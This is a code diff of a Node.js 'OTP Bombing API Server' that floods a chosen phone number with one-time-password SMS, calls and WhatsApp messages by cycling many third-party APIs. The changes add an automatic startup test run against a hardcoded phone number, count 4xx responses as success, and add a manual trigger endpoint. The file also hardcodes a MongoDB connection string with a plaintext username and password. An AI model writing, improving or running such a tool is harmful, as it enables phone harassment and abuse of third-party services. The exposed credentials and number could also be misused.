@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (MongoDB Health Tracking)
-// v3.0 - Slow Mode Lock + Faster First Run + Relaxed Success
+// api_server.js - OTP Bombing API Server (v4.0)
+// Auto Slow Mode + validateStatus Fix + Calls Working
 // ============================================================
 
 const express = require('express');
@@ -18,13 +18,19 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // ============================================================
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
-const DB_NAME = "otp_bomber";
+const DB_NAME = "otp_bom";
 
-const MAX_EFFECTIVE_DURATION = 10;      // minutes - server side cap
-const FIRST_RUN_RETRY = 1;              // retry attempts (kam kiya 2 se 1)
-const FIRST_RUN_DELAY = 50;             // ms delay between APIs (kam kiya 300 se 50)
-const FIRST_RUN_TIMEOUT = 4000;         // per-API timeout in slow mode
-const FIRST_RUN_RETRY_DELAY = 200;      // ms delay between retries (kam kiya 500 se 200)
+const MAX_EFFECTIVE_DURATION = 10;
+const FIRST_RUN_RETRY = 1;
+const FIRST_RUN_DELAY = 50;
+const FIRST_RUN_TIMEOUT = 5000;
+const FIRST_RUN_RETRY_DELAY = 200;
+
+// 🔥 AUTO SLOW MODE CONFIG
+const AUTO_SLOW_MODE = true;                    // server start pe auto test
+const AUTO_SLOW_MODE_PHONE = '7777885694';      // dummy test number
+const AUTO_SLOW_MODE_START_DELAY = 5000;        // 5s wait after DB connect
+const AUTO_SLOW_MODE_MAX_DURATION_MS = 10 * 60 * 1000;  // 10 min max
 
 // ============================================================
 // ===== MONGODB CONNECTION =====
@@ -39,6 +45,14 @@ mongoose.connect(MONGODB_URL, {
     console.log('✅ MongoDB Connected');
     await ensureIndexes();
     await checkFirstRun();
+
+    // 🔥 AUTO SLOW MODE TRIGGER
+    if (AUTO_SLOW_MODE && firstRunMode) {
+        console.log(`⏰ Auto slow mode will start in ${AUTO_SLOW_MODE_START_DELAY / 1000}s...`);
+        setTimeout(() => {
+            triggerAutoSlowMode();
+        }, AUTO_SLOW_MODE_START_DELAY);
+    }
 }).catch(err => {
     console.error('❌ MongoDB Error:', err.message);
     dbConnected = false;
@@ -1236,9 +1250,10 @@ console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
 // ===== GLOBAL STATE =====
 // ============================================================
 
-let firstRunMode = false;         // true = slow mode pending
-let slowModeLock = null;           // Promise lock for slow mode
-let slowModeCompleted = false;     // true = slow mode complete
+let firstRunMode = false;
+let slowModeLock = null;
+let slowModeCompleted = false;
+let autoSlowModeRunning = false;
 
 // ============================================================
 // ===== FIRST-RUN DETECTION =====
@@ -1250,7 +1265,7 @@ async function checkFirstRun() {
         if (count === 0) {
             firstRunMode = true;
             slowModeCompleted = false;
-            console.log('🔄 FIRST RUN MODE: No tested APIs found. Slow mode will activate on first /bomb request.');
+            console.log('🔄 FIRST RUN MODE: No tested APIs found.');
         } else {
             firstRunMode = false;
             slowModeCompleted = true;
@@ -1263,7 +1278,7 @@ async function checkFirstRun() {
 }
 
 // ============================================================
-// ===== API CALL FUNCTION =====
+// ===== API CALL FUNCTION (validateStatus FIX) =====
 // ============================================================
 
 function makeFallbackData(phone, apiName) {
@@ -1327,8 +1342,8 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
             url,
             headers,
             timeout: timeoutMs,
-            maxRedirects: 5
-            // 🔥 validateStatus REMOVED - axios default (2xx = success)
+            maxRedirects: 5,
+            validateStatus: () => true   // 🔥 YEH WAPAS ADD KIYA
         };
 
         if (method === 'post' || method === 'put') {
@@ -1348,7 +1363,7 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
         const response = await axios(config);
         const responseTime = Date.now() - startTime;
 
-        // 🔥 RELAXED SUCCESS: 2xx, 3xx, 4xx sab success (sirf 5xx aur network fail)
+        // 🔥 2xx, 3xx, 4xx sab success (sirf 5xx fail)
         const success = response.status >= 200 && response.status < 500;
 
         return { success, status: response.status, responseTime };
@@ -1359,9 +1374,11 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
             return makeApiCall(api, phone, timeoutMs, retryCount + 1);
         }
 
-        // 🔥 Agar error response hai (4xx), toh bhi success maano
-        if (err.response && err.response.status >= 200 && err.response.status < 500) {
-            return { success: true, status: err.response.status, responseTime: Date.now() - startTime };
+        // 🔥 Agar response hai (4xx/5xx) toh status check karo
+        if (err.response) {
+            const status = err.response.status;
+            const success = status >= 200 && status < 500;
+            return { success, status, responseTime: Date.now() - startTime };
         }
 
         return { success: false, status: null, responseTime: Date.now() - startTime };
@@ -1369,10 +1386,12 @@ async function makeApiCall(api, phone, timeoutMs = 5000, retryCount = 0) {
 }
 
 // ============================================================
-// ===== FIRST-RUN SLOW MODE (LOCKED - SIRF EK BAAR) =====
+// ===== FIRST-RUN SLOW MODE (LOCKED) =====
 // ============================================================
 
-async function firstRunSlowMode() {
+async function firstRunSlowMode(testPhone) {
+    const phoneToTest = testPhone || AUTO_SLOW_MODE_PHONE;
+
     // 🔥 Agar already chal raha hai, toh wahi promise return karo
     if (slowModeLock) {
         console.log('⏳ Slow mode already running. Waiting for completion...');
@@ -1388,19 +1407,26 @@ async function firstRunSlowMode() {
     // 🔥 Naya slow mode start karo, lock set karo
     slowModeLock = (async () => {
         try {
-            console.log('🐢 FIRST RUN SLOW MODE: Testing all APIs one by one...');
+            console.log(`🐢 FIRST RUN SLOW MODE: Testing all APIs (phone: ${phoneToTest})...`);
             const workingApis = [];
-            const testPhone = '9999999999'; // Dummy phone for testing
+            const startTime = Date.now();
 
             for (let i = 0; i < uniqueApis.length; i++) {
                 const api = uniqueApis[i];
+
+                // 🔥 10 min ka timer check
+                if (Date.now() - startTime > AUTO_SLOW_MODE_MAX_DURATION_MS) {
+                    console.log(`⏰ 10 min timer reached! Stopping slow mode at API ${i + 1}/${uniqueApis.length}`);
+                    break;
+                }
+
                 let success = false;
                 let totalResponseTime = 0;
                 let successCount = 0;
                 let failCount = 0;
 
                 for (let attempt = 0; attempt <= FIRST_RUN_RETRY; attempt++) {
-                    const result = await makeApiCall(api, testPhone, FIRST_RUN_TIMEOUT);
+                    const result = await makeApiCall(api, phoneToTest, FIRST_RUN_TIMEOUT);
                     totalResponseTime += result.responseTime;
 
                     if (result.success) {
@@ -1448,21 +1474,44 @@ async function firstRunSlowMode() {
                     console.log(`❌ [${i + 1}/${uniqueApis.length}] ${api.name} - FAILED`);
                 }
 
-                // Small delay between APIs (fast now)
+                // Small delay between APIs
                 await new Promise(r => setTimeout(r, FIRST_RUN_DELAY));
             }
 
             firstRunMode = false;
             slowModeCompleted = true;
-            console.log(`🎯 First run complete. ${workingApis.length}/${uniqueApis.length} APIs working.`);
+            const totalTime = Math.round((Date.now() - startTime) / 1000);
+            console.log(`🎯 First run complete in ${totalTime}s. ${workingApis.length}/${uniqueApis.length} APIs working.`);
 
             return workingApis;
         } finally {
-            slowModeLock = null; // 🔥 Lock release
+            slowModeLock = null;
         }
     })();
 
     return await slowModeLock;
+}
+
+// ============================================================
+// ===== AUTO SLOW MODE TRIGGER =====
+// ============================================================
+
+async function triggerAutoSlowMode() {
+    if (autoSlowModeRunning) return;
+    autoSlowModeRunning = true;
+
+    console.log('⏰ AUTO SLOW MODE STARTING (server startup test)...');
+    console.log(`📞 Test phone: ${AUTO_SLOW_MODE_PHONE}`);
+    console.log(`⏱️  Max duration: ${AUTO_SLOW_MODE_MAX_DURATION_MS / 1000 / 60} minutes`);
+
+    try {
+        await firstRunSlowMode(AUTO_SLOW_MODE_PHONE);
+        console.log('✅ AUTO SLOW MODE COMPLETED');
+    } catch (err) {
+        console.error('❌ AUTO SLOW MODE ERROR:', err.message);
+    } finally {
+        autoSlowModeRunning = false;
+    }
 }
 
 // ============================================================
@@ -1495,6 +1544,7 @@ app.get('/', (req, res) => {
         first_run_mode: firstRunMode,
         slow_mode_running: !!slowModeLock,
         slow_mode_completed: slowModeCompleted,
+        auto_slow_mode_running: autoSlowModeRunning,
         db_connected: dbConnected,
         uptime: process.uptime()
     });
@@ -1507,7 +1557,6 @@ app.post('/bomb', async (req, res) => {
         return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
     }
 
-    // 🔥 DURATION CAP (server side, silent)
     const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);
 
     console.log(`📱 Bombing ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'} | FirstRun: ${firstRunMode} | SlowLock: ${!!slowModeLock}`);
@@ -1516,21 +1565,17 @@ app.post('/bomb', async (req, res) => {
         const startTime = Date.now();
         let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
 
-        // 🔥 WORKING APIS LOAD
         let workingApis = [];
 
         if (firstRunMode || !slowModeCompleted) {
-            // 🔥 First run ya slow mode pending: wait karo complete hone tak
             console.log('⏳ Waiting for slow mode to complete...');
-            workingApis = await firstRunSlowMode();
+            workingApis = await firstRunSlowMode(phone);
         } else {
-            // 🔥 Normal: DB se load karo
             workingApis = await loadWorkingApis();
 
-            // Fallback: agar DB empty hai toh slow mode
             if (workingApis.length === 0) {
                 console.log('⚠️ No working APIs in DB. Activating slow mode...');
-                workingApis = await firstRunSlowMode();
+                workingApis = await firstRunSlowMode(phone);
             }
         }
 
@@ -1546,14 +1591,12 @@ app.post('/bomb', async (req, res) => {
             });
         }
 
-        // 🔥 Bombing request count based on duration
         let maxRequests = 100;
         if (effectiveDuration <= 1) maxRequests = 200;
         else if (effectiveDuration <= 5) maxRequests = 150;
         else if (effectiveDuration <= 10) maxRequests = 100;
         else maxRequests = 80;
 
-        // Shuffle working APIs
         const shuffled = [...workingApis];
         for (let i = shuffled.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
@@ -1628,7 +1671,8 @@ app.get('/health-apis', async (req, res) => {
                 failed,
                 first_run_mode: firstRunMode,
                 slow_mode_running: !!slowModeLock,
-                slow_mode_completed: slowModeCompleted
+                slow_mode_completed: slowModeCompleted,
+                auto_slow_mode_running: autoSlowModeRunning
             },
             apis: apis.map(a => ({
                 name: a.api_name,
@@ -1658,6 +1702,14 @@ app.post('/reset-health', async (req, res) => {
     }
 });
 
+app.post('/trigger-slow-mode', async (req, res) => {
+    if (slowModeLock || autoSlowModeRunning) {
+        return res.json({ success: false, message: 'Slow mode already running' });
+    }
+    triggerAutoSlowMode();
+    res.json({ success: true, message: 'Slow mode triggered manually' });
+});
+
 app.get('/health-stats', async (req, res) => {
     try {
         const total = uniqueApis.length;
@@ -1675,6 +1727,7 @@ app.get('/health-stats', async (req, res) => {
             first_run_mode: firstRunMode,
             slow_mode_running: !!slowModeLock,
             slow_mode_completed: slowModeCompleted,
+            auto_slow_mode_running: autoSlowModeRunning,
             fastest_api: fastest ? { name: fastest.api_name, avg_ms: fastest.avg_response_time } : null,
             slowest_api: slowest ? { name: slowest.api_name, avg_ms: slowest.avg_response_time } : null
         });
@@ -1693,6 +1746,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
     console.log(`📊 APIs loaded: ${uniqueApis.length}`);
     console.log(`⏱️  Max effective duration: ${MAX_EFFECTIVE_DURATION} min`);
-    console.log(`🐢 First-run slow mode: Enabled (LOCKED - sirf ek baar)`);
+    console.log(`🐢 First-run slow mode: Enabled (LOCKED)`);
     console.log(`💾 MongoDB health tracking: Enabled`);
+    console.log(`⏰ Auto slow mode: ${AUTO_SLOW_MODE ? 'ENABLED' : 'DISABLED'}`);
 });
